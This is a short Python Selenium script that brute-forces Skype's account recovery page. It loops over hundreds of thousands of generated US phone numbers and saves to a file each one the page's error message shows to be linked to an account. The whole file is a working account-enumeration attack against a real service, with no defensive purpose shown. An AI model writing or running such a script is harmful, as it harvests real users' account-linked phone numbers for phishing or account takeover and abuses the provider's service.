from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
import time

binary = FirefoxBinary(r"C:\phantomjs-2.1.1-windows\bin\phantomjs.exe")
for number in range(600008,999999,1):
    number = '+1'+ str(number) + '4289'
    print(number)
    driver = webdriver.PhantomJS()
    # or you can use Chrome(executable_path="/usr/bin/chromedriver")
    driver.get("https://login.skype.com/recovery")
    elem = driver.find_element_by_id("emailOrPhone")
    elem.send_keys(number)
    elem.send_keys(Keys.RETURN)
    time.sleep(1)
    elem = driver.find_elements_by_class_name("message_error")
    while len(elem) == 0 :
        time.sleep(1)
        elem = driver.find_elements_by_class_name("message_error")
    data = str(elem[0].text)
    print(data)
    if data.__contains__('email address'):
        with open("skyepbrute.txt", "a") as myfile:
            myfile.write(number)
            myfile.write('\n')
    driver.quit()